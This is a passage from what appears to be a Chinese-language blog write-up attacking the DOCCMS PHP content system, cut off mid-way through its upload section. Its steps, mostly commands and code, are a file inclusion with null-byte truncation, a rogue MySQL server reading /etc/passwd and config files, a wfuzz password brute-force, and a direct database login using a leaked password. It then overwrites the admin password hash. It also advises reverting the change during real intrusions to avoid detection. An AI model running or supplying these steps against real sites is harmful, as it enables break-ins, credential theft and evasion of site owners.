class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;enstr = <span class="variable">$str</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_shal</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> sha1(<span class="keyword">$this</span>-&gt;enstr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_md5</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> md5(<span class="keyword">$this</span>-&gt;enstr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_jxqy3</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$tmpMS</span> = <span class="keyword">$this</span>-&gt;get_shal().<span class="keyword">$this</span>-&gt;get_md5();</span><br><span class="line">		<span class="variable">$tmpNewStr</span> = substr(<span class="variable">$tmpMS</span>,<span class="number">0</span>,<span class="number">9</span>).<span class="string">&#x27;s&#x27;</span>.substr(<span class="variable">$tmpMS</span>,<span class="number">10</span>,<span class="number">9</span>).<span class="string">&#x27;h&#x27;</span>.substr(<span class="variable">$tmpMS</span>,<span class="number">20</span>,<span class="number">9</span>).<span class="string">&#x27;l&#x27;</span>.substr(<span class="variable">$tmpMS</span>,<span class="number">30</span>,<span class="number">9</span>).<span class="string">&#x27;s&#x27;</span>.substr(<span class="variable">$tmpMS</span>,<span class="number">40</span>,<span class="number">9</span>).<span class="string">&#x27;u&#x27;</span>.substr(<span class="variable">$tmpMS</span>,<span class="number">50</span>,<span class="number">9</span>).<span class="string">&#x27;n&#x27;</span>.substr</span><br><span class="line">(<span class="variable">$tmpMS</span>,<span class="number">60</span>,<span class="number">9</span>).<span class="string">&#x27;y&#x27;</span>.substr(<span class="variable">$tmpMS</span>,<span class="number">70</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="variable">$tmpNewStr</span> = substr(<span class="variable">$tmpNewStr</span>,-<span class="number">36</span>).substr(<span class="variable">$tmpNewStr</span>,<span class="number">0</span>,<span class="number">36</span>);</span><br><span class="line">		<span class="variable">$tmpNewStr</span> = substr(<span class="variable">$tmpNewStr</span>,<span class="number">0</span>,<span class="number">70</span>);</span><br><span class="line">		<span class="variable">$tmpNewStr</span> = substr(<span class="variable">$tmpNewStr</span>,<span class="number">0</span>,<span class="number">14</span>).<span class="string">&#x27;j&#x27;</span>.substr(<span class="variable">$tmpNewStr</span>,<span class="number">14</span>,<span class="number">14</span>).<span class="string">&#x27;x&#x27;</span>.substr(<span class="variable">$tmpNewStr</span>,<span class="number">28</span>,<span class="number">14</span>).<span class="string">&#x27;q&#x27;</span>.substr(<span class="variable">$tmpNewStr</span>,<span class="number">32</span>,<span class="number">14</span>).<span class="string">&#x27;y&#x27;</span>.substr(<span class="variable">$tmpNewStr</span>,<span class="number">56</span>,<span class="number">14</span>).<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$tmpNewStr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">to_string</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$tmpstr</span> = <span class="keyword">$this</span>-&gt;get_jxqy3();</span><br><span class="line">		<span class="variable">$tmpstr</span> = substr(<span class="variable">$tmpstr</span>,-<span class="number">35</span>).substr(<span class="variable">$tmpstr</span>,<span class="number">0</span>,<span class="number">40</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$tmpstr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>在管理员主页<code>admini/index.php</code>中发现文件包含点，其中参数 l 通过GET方式传参，带入代码中就是<code>doclang</code>，它会与<code>/../config/doc-config-</code>目录拼接，但是由于<code>.php</code>的存在，我们需要通过00截断将该后缀去除。一旦找到上传文件，利用00截断配合文件包含可以完成代码执行，因此该漏洞比较鸡肋，需要满足PHP小于5.3和存在文件上传点这两个条件，否则无法利用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;l&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[TB_PREFIX.<span class="string">&#x27;doclang&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;l&#x27;</span>]; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[TB_PREFIX.<span class="string">&#x27;doclang&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_GET</span>[<span class="string">&#x27;l&#x27;</span>]= <span class="variable">$_SESSION</span>[TB_PREFIX.<span class="string">&#x27;doclang&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$_GET</span>[<span class="string">&#x27;l&#x27;</span>]= SITELANGUAGE;    </span><br><span class="line">	<span class="variable">$_SESSION</span>[TB_PREFIX.<span class="string">&#x27;doclang&#x27;</span>]=SITELANGUAGE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$dirName</span>=dirname(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$docConfig</span>=<span class="variable">$dirName</span>.<span class="string">&#x27;/../config/doc-config-&#x27;</span>.<span class="variable">$_SESSION</span>[TB_PREFIX.<span class="string">&#x27;doclang&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_file(<span class="variable">$docConfig</span>)||filesize(<span class="variable">$docConfig</span>)==<span class="number">0</span>||filesize(<span class="variable">$docConfig</span>)==<span class="number">3</span>)&#123;<span class="keyword">require_once</span>(<span class="variable">$dirName</span>.<span class="string">&#x27;/../inc/nosetup/setup.html&#x27;</span>);<span class="keyword">exit</span>;&#125;<span class="keyword">else</span>&#123;<span class="keyword">require_once</span>(<span class="variable">$docConfig</span>);&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果文件已上传至 upload 目录中，我们可以请求以下文件完成文件包含</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admini/index.php?l=../upload/file/2013011/1.jpg%00</span><br></pre></td></tr></table></figure>
+
+<h4 id="数据库任意连接"><a href="#数据库任意连接" class="headerlink" title="数据库任意连接"></a>数据库任意连接</h4><p>在<code>/set/checkdb.php</code>中发现它可以连接远程的MySQL服务器，那么我们可以构造一个MySQL假服务器来读取文件内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dbhost</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;dbhost&#x27;</span>];</span><br><span class="line"><span class="variable">$uname</span>  = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$pwd</span>	= <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$dbname</span>	= <span class="variable">$_REQUEST</span>[<span class="string">&#x27;dbname&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]==<span class="string">&quot;chkdb&quot;</span>)&#123;</span><br><span class="line">	<span class="variable">$con</span> = @mysql_connect(<span class="variable">$dbhost</span>,<span class="variable">$uname</span>,<span class="variable">$pwd</span>);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要借助工具<code>Rogue-MySql-Server</code>，该工具存在两种方式完成启动，分别是 python 和 php，如果成功会首先读取目标的<code>/etc/passwd</code></p>
+<p><strong>下载地址：<a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 rogue_mysql_server.py</span><br><span class="line">php roguemysql.php</span><br></pre></td></tr></table></figure>
+<p>访问目标网址，连接本地的MySQL假服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/setup/checkdb.php?dbname=mysql&amp;uname=root&amp;pwd=123456&amp;dbhost=192.168.0.110&amp;action=chkdb</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2006.52.32.png" alt="截屏2022-07-10 06.52.32"></p>
+<p>在本地成功收到响应，文件<code>/etc/passwd</code>读取成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2006.52.59.png" alt="截屏2022-07-10 06.52.59"></p>
+<p>在报错界面中我们已经获取了目标站点的绝对路径为<code>/www/wwwroot/www.ddd4.com</code>，如果先要获取配置文件信息，可以读取<code>/config/doc-config-cn.php</code>文件，在 php 中输入路径</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www/wwwroot/www.ddd4.com/config/doc-config-cn.php</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2007.08.32.png" alt="截屏2022-07-10 07.08.32"></p>
+<p>成功拿到如下数据库配置信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DB_HOSTNAM: localhost</span><br><span class="line">DB_USER: www_ddd4_com</span><br><span class="line">DB_PASSWORD: x4ix6ZrM7b8nFYHn</span><br><span class="line">DB_DBNAME: www_ddd4_com</span><br></pre></td></tr></table></figure>
+
+<p>除了利用MySQL的任意读取文件以外，我们还可以使用这个漏洞对数据库用户进行密码爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/setup/checkdb.php?dbname=mysql&amp;uname=root&amp;pwd=FUZZ&amp;dbhost=localhost&amp;action=chkdb</span><br></pre></td></tr></table></figure>
+<p>利用爆破工具可轻易进行密码爆破，根据结果返回不同判断密码是否正确</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/rockyou.txt -u &quot;http://www.ddd4.com/setup/checkdb.php?dbname=mysql&amp;uname=root&amp;pwd=FUZZ&amp;dbhost=localhost&amp;action=chkdb&quot; --hh 2</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2007.32.05.png" alt="截屏2022-07-10 07.32.05"></p>
+<h4 id="密文替换"><a href="#密文替换" class="headerlink" title="密文替换"></a>密文替换</h4><p>由于密文无法解密，因此我们需要替换该密文。而目前我们已经拥有数据库密码，可直接登录数据库进行修改</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uwww_ddd4_com -px4ix6ZrM7b8nFYHn -hwww.ddd4.com</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2017.39.47.png" alt="截屏2022-07-10 17.39.47"><br>进入对应表中查看密文</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> use www_ddd4_com;</span><br><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> doc_user;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2017.40.31.png" alt="截屏2022-07-10 17.40.31"></p>
+<p>修改程序生成<code>admin</code>对应的密文为<code>33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj57a5a7438n4a0ex4a801yc3d0</code>，需要注意的是在该程序一旦在 PHP 8.0 版本以上会生成不同的密文，可能是加密函数已经发生改变导致结果不同</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">docEncryption</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$enstr</span> = <span class="literal">null</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">docEncryption</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;enstr = <span class="variable">$str</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_shal</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> sha1(<span class="keyword">$this</span>-&gt;enstr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_md5</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> md5(<span class="keyword">$this</span>-&gt;enstr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_jxqy3</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$tmpMS</span> = <span class="keyword">$this</span>-&gt;get_shal().<span class="keyword">$this</span>-&gt;get_md5();</span><br><span class="line">		<span class="variable">$tmpNewStr</span> = substr(<span class="variable">$tmpMS</span>,<span class="number">0</span>,<span class="number">9</span>).<span class="string">&#x27;s&#x27;</span>.substr(<span class="variable">$tmpMS</span>,<span class="number">10</span>,<span class="number">9</span>).<span class="string">&#x27;h&#x27;</span>.substr(<span class="variable">$tmpMS</span>,<span class="number">20</span>,<span class="number">9</span>).<span class="string">&#x27;l&#x27;</span>.substr(<span class="variable">$tmpMS</span>,<span class="number">30</span>,<span class="number">9</span>).<span class="string">&#x27;s&#x27;</span>.substr(<span class="variable">$tmpMS</span>,<span class="number">40</span>,<span class="number">9</span>).<span class="string">&#x27;u&#x27;</span>.substr(<span class="variable">$tmpMS</span>,<span class="number">50</span>,<span class="number">9</span>).<span class="string">&#x27;n&#x27;</span>.substr</span><br><span class="line">(<span class="variable">$tmpMS</span>,<span class="number">60</span>,<span class="number">9</span>).<span class="string">&#x27;y&#x27;</span>.substr(<span class="variable">$tmpMS</span>,<span class="number">70</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="variable">$tmpNewStr</span> = substr(<span class="variable">$tmpNewStr</span>,-<span class="number">36</span>).substr(<span class="variable">$tmpNewStr</span>,<span class="number">0</span>,<span class="number">36</span>);</span><br><span class="line">		<span class="variable">$tmpNewStr</span> = substr(<span class="variable">$tmpNewStr</span>,<span class="number">0</span>,<span class="number">70</span>);</span><br><span class="line">		<span class="variable">$tmpNewStr</span> = substr(<span class="variable">$tmpNewStr</span>,<span class="number">0</span>,<span class="number">14</span>).<span class="string">&#x27;j&#x27;</span>.substr(<span class="variable">$tmpNewStr</span>,<span class="number">14</span>,<span class="number">14</span>).<span class="string">&#x27;x&#x27;</span>.substr(<span class="variable">$tmpNewStr</span>,<span class="number">28</span>,<span class="number">14</span>).<span class="string">&#x27;q&#x27;</span>.substr(<span class="variable">$tmpNewStr</span>,<span class="number">32</span>,<span class="number">14</span>).<span class="string">&#x27;y&#x27;</span>.substr(<span class="variable">$tmpNewStr</span>,<span class="number">56</span>,<span class="number">14</span>).<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$tmpNewStr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">to_string</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$tmpstr</span> = <span class="keyword">$this</span>-&gt;get_jxqy3();</span><br><span class="line">		<span class="variable">$tmpstr</span> = substr(<span class="variable">$tmpstr</span>,-<span class="number">35</span>).substr(<span class="variable">$tmpstr</span>,<span class="number">0</span>,<span class="number">40</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$tmpstr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$docEncryption</span> = <span class="keyword">new</span> docEncryption(<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$docEncryption</span>-&gt;to_string();</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.14.29.png" alt="截屏2022-07-10 18.14.29"></p>
+<p>在数据库中修改用户密文为<code>admin</code>所对应的密文，不过需要注意的是在实际渗透中需要及时修改为原来密码，否则很容易被发现</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> update doc_user <span class="keyword">set</span> pwd<span class="operator">=</span><span class="string">&#x27;33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj57a5a7438n4a0ex4a801yc3d0&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.20.46.png" alt="截屏2022-07-10 18.20.46"></p>
+<p>使用<code>admin/admin</code>成功登录后台<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.22.20.png" alt="截屏2022-07-10 18.22.20"></p>
+<h4 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h4><p>在<code>/admini/controllers/system/bacup.php</code>发现文件上传点，在其中无论提示是否上传成功，文件都会被保存在<code>/temp/data</code>目录当中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uploadsql</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$request</span>;</span><br><span class="line">	<span class="variable">$uploadfile</span>=basename(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]&gt;<span class="variable">$request</span>[<span class="string">&#x27;max_file_size&#x27;</span>])</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;您上传的文件超出了2M的限制!&quot;);window.history.go(-1);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(fileext(<span class="variable">$uploadfile</span>)!=<span class="string">&#x27;sql&#x27;</span>) </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;只允许上传sql格式文件!&quot;);window.history.go(-1);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">	<span class="variable">$savepath</span> = ABSPATH.<span class="string">&#x27;/temp/data/&#x27;</span>.<span class="variable">$uploadfile</span>;</span><br><span class="line">	<span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$savepath</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		 <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;数据库SQL脚本文件上传成功!&quot;);window.history.go(-1);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;数据库SQL脚本文件上传失败!&quot;);window.history.go(-1);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>尝试上传 txt 类型文件，提示<code>只允许上传sql格式文件!</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.40.27.png" alt="截屏2022-07-10 18.40.27"></p>
+<p>尝试访问目标文件，访问成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.41.34.png" alt="截屏2022-07-10 18.41.34"></p>
+<p>但是一旦上传 php 类型文件，就无法访问<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.42.34.png" alt="截屏2022-07-10 18.42.34"></p>
+<p>这主要是由于<code>.htaccess</code>对站点做了伪静态，禁止访问敏感目录中的 php 文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">RewriteRule ^(.*)$ index.php [QSA,PT,L]</span><br><span class="line"><span class="comment">#一级目录禁止</span></span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^/(config|content|editor|keditor|inc|setup|skins|temp|upload|xml)(/|)$ [NC]</span><br><span class="line">RewriteRule .*$ - [F,L]</span><br><span class="line"><span class="comment">#二级以及更深目录禁止</span></span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^/(admini|config|content|editor|keditor|inc|setup|skins|temp|xml)/(.*)[^\.(js|css|gif|jpg|jpeg|png|swf|html|mp3)]$ [NC]</span><br><span class="line">RewriteRule .*$ - [F,L]</span><br><span class="line"><span class="comment">#禁用php文件 editor xml 除外</span></span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; 